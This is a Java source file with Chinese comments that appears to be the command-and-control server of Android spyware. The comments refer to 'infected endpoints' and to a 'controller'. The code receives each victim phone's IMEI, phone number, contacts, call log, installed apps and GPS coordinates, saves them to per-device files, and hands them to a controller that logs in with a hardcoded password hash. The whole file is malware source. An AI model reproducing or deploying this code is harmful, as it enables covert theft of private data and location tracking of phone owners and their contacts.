package com.lu.java;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import net.sf.json.JSONObject;

import com.lu.info.*;
/**
 * 处理客户端消息
 * @author LU
 *
 */
public class MsgTool {
	/**
	 * 更新联系人
	 * @param info
	 */
	public static void contactshandel(String info){
		JSONObject obj = JSONObject.fromObject(info);
		String s = obj.getString("usercontact");
		File old = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+".txt");
		File newFile = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+"tem.txt");

		BufferedReader br;
		String read;
		FileOutputStream fos;
        try {
        	newFile.createNewFile();
        	fos = new FileOutputStream(newFile);
        	PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(old));
			while ((read = br.readLine()) != null){
				if(read.startsWith("Time:")){
					read = "Time:"+getTime();
				}
				if(read.startsWith("UserContacts")){
		            read = "UserContacts:"+s.substring(1, s.length()-1);
				}
		            out.println(read);
		            out.flush();
		    }
			out.close();
			br.close();
			fos.close();
			old.delete();
			newFile.renameTo(old);
			System.out.println(obj.getString("IMEI")+"联系人已更新");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} 
	}
	/**
	 * 更新已安装应用
	 * @param info
	 */
	public static void appInstalledhandle(String info){
		JSONObject obj = JSONObject.fromObject(info);
		String s = obj.getString("appInstalled");
		File old = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+".txt");
		File newFile = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+"tem.txt");

		BufferedReader br;
		String read;
		FileOutputStream fos;
        try {
        	newFile.createNewFile();
        	fos = new FileOutputStream(newFile);
        	PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(old));
			while ((read = br.readLine()) != null){
				if(read.startsWith("Time:")){
					read = "Time:"+getTime();
				}
				if(read.startsWith("AppInstalled")){
		            read = "AppInstalled:"+s.substring(1, s.length()-1);
				}
		            out.println(read);
		            out.flush();
		    }
			out.close();
			br.close();
			fos.close();
			old.delete();
			newFile.renameTo(old);
			System.out.println(obj.getString("IMEI")+"应用列表已更新");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} 
	}
	/**
	 * 更新通话记录
	 * @param info
	 */
	public static void callLogHandle(String info){
		JSONObject obj = JSONObject.fromObject(info);
		String s = obj.getString("callLog");
		File old = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+".txt");
		File newFile = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+"tem.txt");

		BufferedReader br;
		String read;
		FileOutputStream fos;
        try {
        	newFile.createNewFile();
        	fos = new FileOutputStream(newFile);
        	PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(old));
			while ((read = br.readLine()) != null){
				if(read.startsWith("Time:")){
					read = "Time:"+getTime();
				}
				if(read.startsWith("CallLog")){
		            read = "CallLog:"+s.substring(1, s.length()-1);
				}
		            out.println(read);
		            out.flush();
		    }
			out.close();
			br.close();
			fos.close();
			old.delete();
			newFile.renameTo(old);
			System.out.println(obj.getString("IMEI")+"通话记录已更新");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} 
	}
	/**
	 * 更新设备信息
	 * @param info
	 */
	public static void deviceHandle(String info){
		JSONObject obj = JSONObject.fromObject(info);
		File old = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+".txt");
		File newFile = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+"tem.txt");

		BufferedReader br;
		String read;
		FileOutputStream fos;
        try {
        	newFile.createNewFile();
        	fos = new FileOutputStream(newFile);
        	PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(old));
			while ((read = br.readLine()) != null){
				if(read.startsWith("Time:")){
					read = "Time:"+getTime();
				}
				if(read.startsWith("IMEI")){
		            read = "IMEI:"+obj.getString("IMEI");
				}else if(read.startsWith("phoneNumber")){
					read = "phoneNumber:"+obj.getString("phoneNumber");
				}else if(read.startsWith("PhoneFactory")){
					read = "PhoneFactory:"+obj.getString("factory");
				}else if(read.startsWith("PhoneModel")){
					read = "PhoneModel:"+obj.getString("Model");
				}else if(read.startsWith("Version")){
					read = "Version:"+obj.getString("Version");
				}else if(read.startsWith("Operator")){
					read = "Operator:"+obj.getString("operator");
				}
		            out.println(read);
		            out.flush();
		    }
			out.close();
			br.close();
			fos.close();
			old.delete();
			newFile.renameTo(old);
			System.out.println(obj.getString("IMEI")+"设备信息已更新");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} 
	}
	/**
	 * 更新位置信息
	 * @param info
	 */
	public static void locationHandle(String info){
		JSONObject obj = JSONObject.fromObject(info);
		if(obj.getString("latitude").equals("0.0") && obj.getString("longitude").equals("0.0")){
			System.out.println("感染端未获取到位置，更新失败");
			return;
		}
		File old = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+".txt");
		File newFile = new File("E:\\ApkServerData\\phoneData\\"+obj.getString("IMEI")+"tem.txt");

		BufferedReader br;
		String read;
		FileOutputStream fos;
        try {
        	newFile.createNewFile();
        	fos = new FileOutputStream(newFile);
        	PrintWriter out = new PrintWriter(fos);
			br = new BufferedReader(new FileReader(old));
			while ((read = br.readLine()) != null){
				if(read.startsWith("Time:")){
					read = "Time:"+getTime();
				}
				if(read.startsWith("Latitude")){
					read = "Latitude:"+obj.getString("latitude");
				}else if(read.startsWith("Longitude")){
					read = "Longitude:"+obj.getString("longitude");
				}
				out.println(read);
	            out.flush();
	    }
		out.close();
		br.close();
		fos.close();
		old.delete();
		newFile.renameTo(old);
		System.out.println(obj.getString("IMEI")+"位置信息已更新");
        } catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	/**
	 * 控制端请求数据
	 * 拼装成JSON return
	 * @param IMEI
	 * @return
	 */
	public static String outputData(String IMEI){
		File file = new File("E:\\ApkServerData\\phoneData\\"+IMEI+".txt");
		String data ="{";
		String read ;
		if(!file.exists()){
			System.out.println("手机数据请求失败，无"+IMEI+"信息");
			return "noFile";
		}else{		
			try {
				BufferedReader br = new BufferedReader(new FileReader(file));
				while((read = br.readLine()) != null){
					if(read.startsWith("IMEI")){
						//nothing
					}else if(read.startsWith("Latitude")){
						data +="\"Latitude\":\""+read.substring(9)+"\",";
					}else if(read.startsWith("Longitude")){
						data +="\"Longitude\":\""+read.substring(10)+"\",";
					}else if(read.startsWith("PhoneNumber")){
						data += "\"PhoneNumber\":\""+read.substring(12)+"\",";
					}else if(read.startsWith("PhoneFactory")){
						data += "\"PhoneFactory\":\""+read.substring(13)+"\",";
					}else if(read.startsWith("PhoneModel")){
						data += "\"PhoneModel\":\""+read.substring(11)+"\",";
					}else if(read.startsWith("Version")){
						data += "\"Version\":\""+read.substring(8)+"\",";
					}else if(read.startsWith("Opreator")){
						data += "\"Opreator\":\""+read.substring(9)+"\",";
					}else if(read.startsWith("UserContacts")){
						data += "\"UserContacts\":\""+read.substring(13)+"\",";
					}else if(read.startsWith("CallLog")){
						data += "\"CallLog\":\""+read.substring(8)+"\",";
					}else if(read.startsWith("Time")){
						data += "\"Time\":\""+read.substring(5)+"\",";
					}else if(read.startsWith("AppInstalled")){
						data += "\"AppInstalled\":\""+read.substring(13)+"\"";
					}
				}
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		data = data+"}";
		System.out.println("控制端手机数据请求成功");
		return data;
	}
	
	/**
	 * 初始信息
	 * 响应init(Context context)
	 * @param info
	 * @return
	 */
	public static void msgHandle(String info){
		PhoneInfo phone = new PhoneInfo();
		JSONObject obj = JSONObject.fromObject(info);  
		List<String> temp = new ArrayList<String>();
		phone.setPhoneIMEI(obj.getString("IMEI"));
		phone.setPhoneNumber(obj.getString("phoneNumber"));
        phone.setPhoneFactory(obj.getString("factory"));
        phone.setPhoneModel(obj.getString("Model"));
        phone.setPhoneVersion(obj.getString("Version"));
        phone.setPhoneSimOperator(obj.getString("operator"));
        phone.setLatitude(Double.parseDouble(obj.getString("latitude")));
        phone.setLongitude(Double.parseDouble(obj.getString("longitude")));
        String s1 = obj.getString("usercontact");
        String[] sContacts = s1.substring(1, s1.length()-1).split(", ");
        
        int localFlag = 0;
        String lat="0.0",log="0.0";
        
        for(int i = 0; i < sContacts.length; i++){
        	temp.add(sContacts[i]);
        }
        
        phone.setPhoneContacter(temp);
        temp.clear();
       
        String s2 = obj.getString("appInstalled");
        String[] sApp = s2.substring(1, s2.length()-1).split(", ");
        for(int i = 0; i < sApp.length; i++){
        	temp.add(sApp[i]);
        }
        phone.setPhoneAppInstalled(temp);
        temp.clear();
        
        String s3 = obj.getString("callLog");
        String[] sCall = s3.substring(1, s3.length()-1).split(", ");
        for(int i = 0; i < sCall.length; i++){
        	temp.add(sCall[i]);
        }
        phone.setPhoneCallLog(temp);
        temp.clear();
        
        if(phone.getPhoneIMEI() == null){
        	phone.setPhoneIMEI("08143381");
        }
		File file = new File("E:\\ApkServerData\\phoneData\\"+phone.getPhoneIMEI()+".txt");
		if(file.exists()){
			localFlag = 1;
			
			try {
				BufferedReader br = new BufferedReader(new FileReader(file));
				String read;
				while((read = br.readLine()) != null){
					if(read.startsWith("Latitude")){
						lat = read.substring(9);
					}else if(read.startsWith("Longitude")){
						log = read.substring(10);
					}
				}
			}catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 
			catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			file.delete();
		}else{
			System.out.println("新感染端出现，IMEI："+phone.getPhoneIMEI());
			setNewIMEI(phone.getPhoneIMEI());
		}
			try {
				file.createNewFile();
				PrintStream out = new PrintStream(new FileOutputStream(file));
				out.println("Time:"+getTime());
	        	out.println("IMEI:"+phone.getPhoneIMEI());
	        	if(obj.getString("latitude").equals("0.0") && obj.getString("longitude").equals("0.0")){
	        		if(localFlag == 0){
	        			out.println("Latitude:"+phone.getLatitude());
	    	        	out.println("Longitude:"+phone.getLongitude());
	        		}else if (localFlag ==1){
	        			out.println("Latitude:"+lat);
	    	        	out.println("Longitude:"+log);
	        		}
	        	}
	        	out.println("PhoneNumber:"+phone.getPhoneNumber());
	        	out.println("PhoneFactory:"+phone.getPhoneFactory());
	        	out.println("PhoneModel:"+phone.getPhoneModel());
	        	out.println("Version:"+phone.getPhoneVersion());
	        	out.println("Opreator:"+phone.getPhoneSimOperator());
	        	out.println("UserContacts:"+s1.substring(1, s1.length()-1));
	        	out.println("CallLog:"+s3.substring(1, s3.length()-1));
	        	out.println("AppInstalled:"+s2.substring(1, s2.length()-1));
	        	System.out.println(phone.getPhoneIMEI()+"全部数据更新成功");
	        	out.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	/**
	 * 控制端登录验证
	 * @param info
	 * @return
	 */
	public static String passwordVerify(String info){
		if(info.equals("9a3161593340c3c2d97141db64b90568")){
			System.out.println("控制端登陆成功");
			return "Logined";	
		}
		System.out.println("控制端登录密码错误");
		return "noLogin";
	}
	/**
	 * 返回IMEI列表给客户端
	 * @return
	 */
	public static String returnIMEI(){
		File file = new File("E:\\ApkServerData\\phoneData\\index.txt");
		String read;
		String data = "";
		try {
			BufferedReader br = new BufferedReader(new FileReader(file));
			while((read = br.readLine()) != null){
					data +=read+",";
			}
			data=data.substring(0,data.length()-1);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println("控制端IMEI列表请求成功");
		return data;
	}
	/**
	 * 获取系统时间
	 * @return
	 */
	public static String getTime(){
		SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String time = df.format(new Date());
        return time;
	}
	
	/**
	 * index添加新数据
	 * @param IMEI
	 */
	public static void setNewIMEI(String IMEI){
		File file = new File("E:\\ApkServerData\\phoneData\\index.txt");
		
		FileOutputStream fos;
		
		try {
			fos = new FileOutputStream(file,true);
			PrintWriter out = new PrintWriter(fos);
			out.println(IMEI);
			out.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
}
